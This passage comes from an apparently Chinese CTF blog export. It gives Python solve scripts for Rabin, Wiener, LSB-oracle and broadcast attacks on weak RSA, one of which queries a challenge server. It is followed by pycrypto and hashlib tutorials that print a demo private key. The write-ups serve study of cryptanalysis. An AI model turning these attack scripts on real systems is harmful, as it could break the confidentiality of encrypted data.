<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_decrypt</span><span class="params">(c, p, q, e=<span class="number">2</span>)</span>:</span></span><br><span class="line">    n = p * q</span><br><span class="line">    mp = pow(c, (p + <span class="number">1</span>) / <span class="number">4</span>, p)</span><br><span class="line">    mq = pow(c, (q + <span class="number">1</span>) / <span class="number">4</span>, q)</span><br><span class="line">    yp = gmpy2.invert(p, q)</span><br><span class="line">    yq = gmpy2.invert(q, p)</span><br><span class="line">    r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">    rr = n - r</span><br><span class="line">    s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">    ss = n - s</span><br><span class="line">    <span class="keyword">return</span> (r, rr, s, ss)</span><br></pre></td></tr></table></figure>
<p>Jarvis OJ hard RSA</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n=<span class="number">0xC2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</span></span><br><span class="line">p=<span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">q=<span class="number">319576316814478949870590164193048041239</span></span><br><span class="line">e=<span class="number">2</span></span><br><span class="line">c=int(open(<span class="string">'hardRSA.rar/flag.enc'</span>,<span class="string">'rb'</span>).read().encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">mp=pow(c,(p+<span class="number">1</span>)/<span class="number">4</span>,p)</span><br><span class="line">mq=pow(c,(q+<span class="number">1</span>)/<span class="number">4</span>,q)</span><br><span class="line">yp=gmpy2.invert(p,q)</span><br><span class="line">yq=gmpy2.invert(q,p)</span><br><span class="line">r=(yp*p*mq+yq*q*mp)%n</span><br><span class="line">rr=n-r</span><br><span class="line">s=(yp*p*mq-yq*q*mp)%n</span><br><span class="line">ss=n-s</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(r)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(rr)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(s)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(ss)</span><br></pre></td></tr></table></figure>
</li>
<li><p>Wiener’s Attack:适用情况：e过大或过小(低解密指数攻击)</p>
<p>工具地址：[]:<a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="noopener">https://github.com/pablocelayes/rsa-wiener-attack</a></p>
<p>这里脚本运行报错的话，再脚本前加上：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>   sys</span><br><span class="line">sys.setrecursionlimit(<span class="number">10000000</span>)</span><br></pre></td></tr></table></figure>
<p>python实现：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiener_hack</span><span class="params">(e, n)</span>:</span></span><br><span class="line">    frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            discr = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> (discr &gt;= <span class="number">0</span>):</span><br><span class="line">                t = Arithmetic.is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t != <span class="number">-1</span> <span class="keyword">and</span> (s + t) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">"Hacked!"</span>)</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure>
<p>nextrsa-Level2</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">0x92411fa0c93c1b27f89e436d8c4698bcf554938396803a5b62bd10c9bfcbf85a483bd87bb2d6a8dc00c32d8a7caf30d8899d90cb8f5838cae95f7ff5358847db1244006c140edfcc36adbdcaa16cd27432b4d50d2348b5c15c209364d7914ef50425e4c3da07612cc34e9b93b98d394b43f3eb0a5a806c70f06697b6189606eb9707104a7b6ff059011bac957e2aae9ec406a4ff8f8062400d2312a207a9e018f4b4e961c943dfc410a26828d2e88b24e4100162228a5bbf0824cf2f1c8e7b915efa385efeb505a9746e5d19967766618007ddf0d99525e9a41997217484d64c6a879d762098b9807bee46a219be76941b9ff31465463981e230eecec69691d1L</span></span><br><span class="line">e = <span class="number">0x6f6b385dd0f06043c20a7d8e5920802265e1baab9d692e7c20b69391cc5635dbcaae59726ec5882f168b3a292bd52c976533d3ad498b7f561c3dc01a76597e47cfe60614f247551b3dbe200e2196eaa001a1d183886eeacddfe82d80b38aea24de1a337177683ed802942827ce4d28e20efef92f38f1b1a18c66f9b45f5148cceabfd736de8ac4a49e63a8d35a83b664f9f3b00f822b6f11ff13257ee6e0c00ca5c98e661ea594a9e66f2bd56b33d9a13f5c997e67a37fcf9a0c7f04d119fe1ba261127357e64a4b069aefed3049c1c1fe4f964fd078b88bedd064abea385cfebd65e563f93c12d34eb6426e8aa321033cfd8fe8855b9e74d07fe4f9d70de46fL</span></span><br><span class="line">d = wiener_hack(e, n)</span><br><span class="line"><span class="keyword">print</span> d</span><br></pre></td></tr></table></figure>
</li>
<li><p>私钥文件修复:适用情况：提供破损的私钥文件</p>
<p>Jarvis OJ-God Like RSA  []:<a href="https://www.40huo.cn/blog/rsa-private-key-recovery-and-oaep.html" target="_blank" rel="noopener">https://www.40huo.cn/blog/rsa-private-key-recovery-and-oaep.html</a></p>
</li>
<li><p>LSB Oracle Attack:适用情况：可以选择密文并泄露最低位</p>
<blockquote>
<p>在一次RSA加密中，明文为m，模数为n，加密指数为e，密文为c。我们可以构造出<code>c&#39;=((2^e)*c)%n=((2^e)*(m^e))%n=((2*m)^e)%n</code> ， 因为m的两倍可能大于n，所以经过解密得到的明文是 <code>m&#39;=(2*m)%n</code> 。我们还能够知道 <code>m&#39;</code> 的最低位<code>lsb</code> 是1还是0。 因为n是奇数，而<code>2*m</code> 是偶数，所以如果<code>lsb</code>是0，说明<code>(2*m)%n</code> 是偶数，没有超过n，即<code>m&lt;n/2.0</code> ，反之则<code>m&gt;n/2.0</code> 。举个例子就能明白<code>2%3=2</code> 是偶数，而<code>4%3=1</code> 是奇数。以此类推，构造密文<code>c&quot;=(4^e)*c)%n</code> 使其解密后为<code>m&quot;=(4*m)%n</code> ，判断<code>m&quot;</code> 的奇偶性可以知道<code>m</code> 和 <code>n/4</code> 的大小关系。所以我们就有了一个二分算法，可以在对数时间内将m的范围逼近到一个足够狭窄的空间</p>
</blockquote>
</li>
</ul>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> decimal</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> lsb == <span class="string">'odd'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial</span><span class="params">(c, e, n)</span>:</span></span><br><span class="line">    k = n.bit_length()</span><br><span class="line">    decimal.getcontext().prec = k  <span class="comment"># for 'precise enough' floats</span></span><br><span class="line">    lo = decimal.Decimal(<span class="number">0</span>)</span><br><span class="line">    hi = decimal.Decimal(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(k):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> oracle(c):</span><br><span class="line">            hi = (lo + hi) / <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lo = (lo + hi) / <span class="number">2</span></span><br><span class="line">        c = (c * pow(<span class="number">2</span>, e, n)) % n</span><br><span class="line">        <span class="comment"># print i, int(hi - lo)</span></span><br><span class="line">    <span class="keyword">return</span> int(hi)</span><br></pre></td></tr></table></figure>
<p>  Baby RSA</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">e = 0x10001</span><br><span class="line">n = 0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716db</span><br><span class="line">c = 0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0</span><br><span class="line"></span><br><span class="line">λ nc 47.96.239.28 23333</span><br><span class="line">----------------------------- baby rsa -----------------------------</span><br><span class="line">Come and Decode your data</span><br><span class="line">If you give me ciphertext, I can tell you whether decoded data is even or odd</span><br><span class="line">You can input ciphertext(hexdecimal) now</span><br><span class="line">1</span><br><span class="line">odd</span><br></pre></td></tr></table></figure>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"><span class="comment"># ref:</span></span><br><span class="line"><span class="comment"># https://crypto.stackexchange.com/questions/11053/rsa-least-significant-bit-oracle-attack</span></span><br><span class="line"><span class="comment"># https://ctf.rip/sharif-ctf-2016-lsb-oracle-crypto-challenge/</span></span><br><span class="line"><span class="comment"># https://introspelliam.github.io/2018/03/27/crypto/RSA-Least-Significant-Bit-Oracle-Attack/</span></span><br><span class="line"><span class="keyword">import</span> libnum, gmpy2, socket, time, decimal</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(c1)</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    hostname = <span class="string">'47.96.239.28'</span></span><br><span class="line">    port = <span class="number">23333</span></span><br><span class="line">    s.connect((hostname, port))</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(hex(c1)[<span class="number">2</span>:].strip(<span class="string">"lL"</span>) + <span class="string">'\n'</span>)</span><br><span class="line">    res = s.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    s.close()</span><br><span class="line">    <span class="keyword">if</span> res == <span class="string">'even'</span>: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> res == <span class="string">'odd'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">assert</span> (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial</span><span class="params">(c, n)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> c_of_2</span><br><span class="line">    k = n.bit_length()</span><br><span class="line">    decimal.getcontext().prec = k  <span class="comment"># allows for 'precise enough' floats</span></span><br><span class="line">    lower = decimal.Decimal(<span class="number">0</span>)</span><br><span class="line">    upper = decimal.Decimal(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(k):</span><br><span class="line">        possible_plaintext = (lower + upper) / <span class="number">2</span></span><br><span class="line">        <span class="comment"># lower==0 when i&lt;1809</span></span><br><span class="line">        flag = oracle(c)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            upper = possible_plaintext  <span class="comment"># plaintext is in the lower half</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lower = possible_plaintext  <span class="comment"># plaintext is in the upper half</span></span><br><span class="line">        c = (c * c_of_2) % n  <span class="comment"># multiply y by the encryption of 2 again</span></span><br><span class="line">        <span class="keyword">print</span> i, flag, int(upper - lower)</span><br><span class="line">        <span class="comment"># time.sleep(0.2)</span></span><br><span class="line">    <span class="comment"># By now, our plaintext is revealed!</span></span><br><span class="line">    <span class="keyword">return</span> int(upper)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Conducting Oracle attack..."</span></span><br><span class="line">    <span class="keyword">return</span> partial((c * c_of_2) % n, n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    n = <span class="number">0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716db</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>选择密文攻击:适用情况：可以构造任意密文并获得对应明文(在一个RSA加密过程中，明文为m，密文为c，模数为n，加密指数为e，选取x以满足<code>gcd(x,n)==1</code> 从而使x模n的逆存在，构造密文 <code>c&#39;=c*(x^e)</code> 使解密后明文为 <code>m&#39;=(m*x)%n</code> ，则<code>m=m&#39;*x^-1(mod n)</code>)</p>
</li>
<li><p>广播攻击:适用情况：模数n、密文c不同，明文m、加密指数e相同。一般会是e=k，然后给k组数据(使用不同的模数n，相同的公钥指数e加密相同的信息。就会得到多个(m^e) ==ci (mod ni)，将(m^e)视为一个整体M，这就是典型的中国剩余定理适用情况)</p>
<p>nextrsa-Level9</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = random.randint(<span class="number">0x100000000000</span>, <span class="number">0xffffffffffff</span>)</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">n1 = <span class="number">0x43d819a4caf16806e1c540fd7c0e51a96a6dfdbe68735a5fd99a468825e5ee55c4087106f7d1f91e10d50df1f2082f0f32bb82f398134b0b8758353bdabc5ba2817f4e6e0786e176686b2e75a7c47d073f346d6adb2684a9d28b658dddc75b3c5d10a22a3e85c6c12549d0ce7577e79a068405d3904f3f6b9cc408c4cd8595bf67fe672474e0b94dc99072caaa4f866fc6c3feddc74f10d6a0fb31864f52adef71649684f1a72c910ec5ca7909cc10aef85d43a57ec91f096a2d4794299e967fcd5add6e9cfb5baf7751387e24b93dbc1f37315ce573dc063ecddd4ae6fb9127307cfc80a037e7ff5c40a5f7590c8b2f5bd06dd392fbc51e5d059cffbcb85555L</span></span><br><span class="line">n2 = <span class="number">0x60d175fdb0a96eca160fb0cbf8bad1a14dd680d353a7b3bc77e620437da70fd9153f7609efde652b825c4ae7f25decf14a3c8240ea8c5892003f1430cc88b0ded9dae12ebffc6b23632ac530ac4ae23fbffb7cfe431ff3d802f5a54ab76257a86aeec1cf47d482fec970fc27c5b376fbf2cf993270bba9b78174395de3346d4e221d1eafdb8eecc8edb953d1ccaa5fc250aed83b3a458f9e9d947c4b01a6e72ce4fee37e77faaf5597d780ad5f0a7623edb08ce76264f72c3ff17afc932f5812b10692bcc941a18b6f3904ca31d038baf3fc1968d1cc0588a656d0c53cd5c89cedba8a5230956af2170554d27f524c2027adce84fd4d0e018dc88ca4d5d26867L</span></span><br><span class="line">n3 = <span class="number">0x280f992dd63fcabdcb739f52c5ed1887e720cbfe73153adf5405819396b28cb54423d196600cce76c8554cd963281fc4b153e3b257e96d091e5d99567dd1fa9ace52511ace4da407f5269e71b1b13822316d751e788dc935d63916075530d7fb89cbec9b02c01aef19c39b4ecaa1f7fe2faf990aa938eb89730eda30558e669da5459ed96f1463a983443187359c07fba8e97024452087b410c9ac1e39ed1c74f380fd29ebdd28618d60c36e6973fc87c066cae05e9e270b5ac25ea5ca0bac5948de0263d8cc89d91c4b574202e71811d0ddf1ed23c1bc35f3a042aac6a0bdf32d37dede3536f70c257aafb4cfbe3370cd7b4187c023c35671de3888a1ed1303L</span></span><br><span class="line">c1 = pow(m, e, n1)</span><br><span class="line">c2 = pow(m, e, n2)</span><br><span class="line">c3 = pow(m, e, n3)</span><br><span class="line"><span class="keyword">print</span> m == gmpy2.iroot(CRT([n1, n2, n3], [c1, c2, c3]), e)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><blockquote>
<p>看了各位表哥写的关于RSA的文章，学到了很多，以前之学习了数论，在代码上实践的很少，对这些脚本进行学习，总结，在RSA这一块有了很大的帮助。各位表哥的脚本写的很好，值得学习。</p>
</blockquote>
<p>参考链接：</p>
<p>[]:<a href="https://www.anquanke.com/post/id/84632" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84632</a></p>
<p>[]:<a href="https://github.com/findneo/RSA-ATTACK" target="_blank" rel="noopener">https://github.com/findneo/RSA-ATTACK</a></p>
<p>[]:<a href="https://blog.csdn.net/qq_31481187/article/details/70448108" target="_blank" rel="noopener">https://blog.csdn.net/qq_31481187/article/details/70448108</a></p>
<p>[]:<a href="https://blog.csdn.net/like98k/article/details/79352076" target="_blank" rel="noopener">https://blog.csdn.net/like98k/article/details/79352076</a></p>
]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>密码学</tag>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>python-pycrypto模块浅学</title>
    <url>/2018/08/31/python-pycrypto%E6%A8%A1%E5%9D%97%E6%B5%85%E5%AD%A6/</url>
    <content><![CDATA[<h3 id="python-pycrypto模块学习"><a href="#python-pycrypto模块学习" class="headerlink" title="python-pycrypto模块学习"></a>python-pycrypto模块学习</h3><blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; pycrypto模块时python中来处理加密解密等信息安全相关的一个重要模块</span><br><span class="line">&gt; 对称加密方式：</span><br><span class="line">&gt; </span><br><span class="line">&gt; AES</span><br><span class="line">&gt; DES</span><br><span class="line">&gt; ARC4</span><br><span class="line">&gt; 散列值计算：</span><br><span class="line">&gt; </span><br><span class="line">&gt; MD5</span><br><span class="line">&gt; SHA</span><br><span class="line">&gt; HMAC</span><br><span class="line">&gt; 公钥加密和签名：</span><br><span class="line">&gt; </span><br><span class="line">&gt; RSA</span><br><span class="line">&gt; DSA</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="生成公私密钥"><a href="#生成公私密钥" class="headerlink" title="生成公私密钥"></a>生成公私密钥</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#伪随机数生成器</span></span><br><span class="line">random_generator = Random.new().read</span><br><span class="line"><span class="comment">#rsa算法生成实例</span></span><br><span class="line">rsa = RSA.generate(<span class="number">1024</span>,random_generator)</span><br><span class="line"><span class="comment">#master的密钥对的生成</span></span><br><span class="line">private_pem = rsa.exportKey()</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成公私钥对文件</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'master-private.pem'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(private_pem)</span><br><span class="line"></span><br><span class="line">public_pem = rsa.publickey().exportKey()</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'master-public.pem'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(public_pem)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDXamjBCTqlzBxnk0B00G/Ae6hk</span></span><br><span class="line"><span class="string">pKS/0zz0Q7qvCGOjWttrmPyvDdMgxyGnJri4PHvMkN0jAMbU32NKN8ojcoKOdH43</span></span><br><span class="line"><span class="string">4DPL/ClbqMi5usk70HLDpfhWs/ylOJ6H01JyIzONnZsr3MdOde8RNvn2ZGjk3JqX</span></span><br><span class="line"><span class="string">DfOzB3T0Ad0F3p7OBwIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----BEGIN RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIICXAIBAAKBgQDXamjBCTqlzBxnk0B00G/Ae6hkpKS/0zz0Q7qvCGOjWttrmPyv</span></span><br><span class="line"><span class="string">DdMgxyGnJri4PHvMkN0jAMbU32NKN8ojcoKOdH434DPL/ClbqMi5usk70HLDpfhW</span></span><br><span class="line"><span class="string">s/ylOJ6H01JyIzONnZsr3MdOde8RNvn2ZGjk3JqXDfOzB3T0Ad0F3p7OBwIDAQAB</span></span><br><span class="line"><span class="string">AoGAeVSc9gUtvE7PvOLqjiEMoJzFxxIZHVZsYaR4VLfj7xFwvxTnVe3yeebPJKeh</span></span><br><span class="line"><span class="string">qVuf2yPI+jsowqOj+ByeRQLtVyjoZH7aW6uZQcKUtMrAMgcZouIKpKVWFhjWguFl</span></span><br><span class="line"><span class="string">CExsfi8EqzxVsBPBkHynqkU69IB4yPB1AMRb4ZcGsYvCgNECQQDpBoiaMD72+YOb</span></span><br><span class="line"><span class="string">bnXKhqW8PxU6/ylZvZL+wFE4Qwcu0nclni/vMMkrxK8oZvAiVOqBjCSXwcA6zZXL</span></span><br><span class="line"><span class="string">MZppBJaZAkEA7Kdo+7fCUyAeivzoYGHKE8Kmr/RTHW7oSgz1bBMdzAugsO8zuNGA</span></span><br><span class="line"><span class="string">fMnLYXTGBJFlfPQuOW3W6Q5UKHppV0uNnwJBAL0kU36ryH/ZGWzxJOUFk8MPhSEE</span></span><br><span class="line"><span class="string">+cBgss7atVIwfcUQiitbkdbZR4CiPfZST3neaRZL9WvElU5ljr+GfKnfUokCQA5L</span></span><br><span class="line"><span class="string">wqzKGgQZgZ7VzlfcMG/nJ1ijws2ZYJDwnXbM5NTpsuhdWtuEVGW1bwLRIhEuk1ns</span></span><br><span class="line"><span class="string">CkrP1ta3VeAoHOr4FnMCQDxnFKPCpjRSEM96xFDNgNh+66wgKg/SXMY5E7e0/LvB</span></span><br><span class="line"><span class="string">oFcJauclu+cP8eaqP0zasVR/xqQT4y091vSZzIADJLA=</span></span><br><span class="line"><span class="string">-----END RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>
<h3 id="利用python对RSA根据公私钥加解密"><a href="#利用python对RSA根据公私钥加解密" class="headerlink" title="利用python对RSA根据公私钥加解密"></a>利用python对RSA根据公私钥加解密</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#RSA使用公私钥加解密数据：</span></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5 <span class="keyword">as</span> Cipher_phcs_v1_5</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">message = <span class="string">'hello demos this is a plian text!'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./master-public.pem'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = f.read()</span><br><span class="line">    rsakey = RSA.importKey(key)    <span class="comment">#导入读取到的公钥</span></span><br><span class="line">    cipher = Cipher_phcs_v1_5.new(rsakey)  <span class="comment">#实例化</span></span><br><span class="line">    cipher_text = base64.b64encode(cipher.encrypt(message))  <span class="comment">#这里需要注意的一点是，py2可以直接将str加密，而py3要转换为bytes</span></span><br><span class="line">    <span class="comment"># cipher_text = base64.b64encode(cipher.encrypt(message).encode(encoding = 'utf-8'))   #语句如下</span></span><br><span class="line">    <span class="keyword">print</span> cipher_text</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./master-private.pem'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = f.read()</span><br><span class="line">    rsakey = RSA.importKey(key)</span><br><span class="line">    cipher = Cipher_phcs_v1_5.new(rsakey)</span><br><span class="line">    text = cipher.decrypt(base64.b64decode(cipher_text),<span class="string">"ERROR"</span>)</span><br><span class="line">    <span class="keyword">print</span> text        <span class="comment">#py2这里返回的是str类型的，py3返回的是bytes，需要自己转换</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1535692492.84.png" alt></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><blockquote>
<p>在python中libnum、gmpy2、pycrypto在密码学中的应用广泛，也特别方便。</p>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
        <tag>pycrypto</tag>
      </tags>
  </entry>
  <entry>
    <title>python常用模块—-hashlib</title>
    <url>/2018/08/30/python%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97%E2%80%94-hashlib/</url>
    <content><![CDATA[<h3 id="python常用模块——hashlib"><a href="#python常用模块——hashlib" class="headerlink" title="python常用模块——hashlib"></a>python常用模块——hashlib</h3><blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; python的hashlib提供了常见的摘要算法，如MD5,SHA1等</span><br><span class="line">&gt; 摘要算法又称为hash算法、散列算法。它通过一个函数把任意长度的数据转换为一个长度的固定的数据串（通常用十六进制字符串表示）</span><br><span class="line">&gt; 摘要算法反推很困难，因为摘要函数是单向的，对原始数据做一个bit的修改，都会导致计算出的摘要完全不同</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="hashlib模块学习"><a href="#hashlib模块学习" class="headerlink" title="hashlib模块学习"></a>hashlib模块学习</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(<span class="string">'how to use md5 in python hashlib?'</span>)</span><br><span class="line"><span class="comment">#使用生成实例的update方法进行MD5的转换，同时，update会将每次的字符串拼接，如果想要不同的值，每次过后都得实例化</span></span><br><span class="line"><span class="keyword">print</span> md5.hexdigest()   <span class="comment">#返回摘要信息，以十六进制数据返回</span></span><br><span class="line"><span class="keyword">print</span> md5.digest()      <span class="comment">#返回摘要信息，以二进制数据返回</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#刚才说过的update，如果数据量很大，可以使用它拼接</span></span><br><span class="line"><span class="comment">#MD5是最常见的摘要算法，速度很快，生成结果是固定的128 bit字节，通常用一个32位的16进制字符串表示</span></span><br><span class="line">md52 = hashlib.md5()</span><br><span class="line">md5.update(<span class="string">'how to use md5 in'</span>)</span><br><span class="line">md5.update(<span class="string">'python hashlib?'</span>)</span><br><span class="line"><span class="keyword">print</span> md5.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="comment">#SHA1的结果是160 bit字节，通常用一个40位的16进制字符串表示</span></span><br><span class="line"><span class="comment">#有没有可能两个不同的数据通过某个摘要算法得到了相同的摘要？完全有可能，因为任何摘要算法都是把无限多的数据集合映射到一个有限的集合中。这种情况称为碰撞</span></span><br><span class="line">sha1 = hashlib.sha1()</span><br><span class="line">sha1.update(<span class="string">'how to use sha1 in '</span>)</span><br><span class="line">sha1.update(<span class="string">'python hashlib?'</span>)</span><br><span class="line"><span class="keyword">print</span> sha1.hexdigest()</span><br></pre></td></tr></table></figure>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>1.进行hash爆破：</p>
